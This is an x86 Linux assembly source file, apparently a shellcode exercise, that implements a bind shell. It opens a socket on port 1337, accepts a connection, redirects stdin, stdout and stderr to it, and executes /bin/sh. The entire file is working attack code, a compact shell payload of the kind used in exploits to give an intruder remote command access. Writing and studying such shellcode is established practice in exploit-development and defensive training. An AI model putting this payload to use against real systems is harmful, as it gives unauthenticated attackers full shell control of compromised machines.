
;---------------------------------
;
; Author: Michael Dubell
; 
; Purpose:
; Start a bind shell on port 1337
; On connection, execute /bin/sh
;
;----------------------------------

global _start

section .text
_start:

    ; zero out registers
    xor eax, eax
    xor ebx, ebx
    xor edx, edx

    ; -------------------------------------
    ; # Setup socket
    
    ; socketcall()
    ; Resulting FD is saved to eax
    mov al, 0x66
    mov bl, 0x1

    ; # Setup socket
    push edx
    push 0x1
    push 0x2
    mov ecx, esp    ; Arguments are located top of the stack
    int 0x80
    mov edi, eax    ; $eax Contains the file descriptor created by socket()

    ; ---------------------------------
    ; # Setup bind
    ; socketcall
    mov al, 0x66
    mov bl, 0x2     ; bind syscall number

    ; setup sockaddr struct
    push edx
    push word 0x3905 ; htons(1337)
    push word 0x2

    mov ecx, esp
    
    ; Push the arguments for bind()
    push 0x10
    push ecx
    push edi

    mov ecx, esp    
    int 0x80
    
    ; --------------------
    ; # Setup listen
    ; socketcall
    mov al, 0x66
    mov bl, 0x4

    push 0x2
    push edi
    mov ecx, esp
    int 0x80

    ; --------------------
    ; # Setup accept
    ; socketcall
    mov al, 0x66
    mov bl, 0x5

    ; Setup accept
    push edx
    push edx
    push edi

    mov ecx, esp

    int 0x80
    mov edi, eax
    ; --------------------
    ; # Setup dup2
    ; redirect to stdin
    mov al, 0x3f     ; syscall number dup2 63 --> 0x3f
    mov ebx, edi
    mov ecx, edx
    int 0x80

    ; redirect to stdout
    mov al, 0x3f
    mov cl, 0x1
    int 0x80

    ; redirect to stderr
    mov al, 0x3f
    mov cl, 0x2
    int 0x80

    ; --------------------
    ; # Setup execv
    xor edx, edx
    push edx
    
    ; push //bin/sh onto the stack
    push 0x68732f6e
    push 0x69622f2f  

    ; Set address of esp to ebx, which points
    ; to //bin/sh
    mov ebx, esp
    
    xor ecx, ecx
    xor eax, eax
    mov al, 0xb
    int 0x80

    ; -----------------------------
    ; THE END - HAVE A NICE SHELL |
    ; -----------------------------

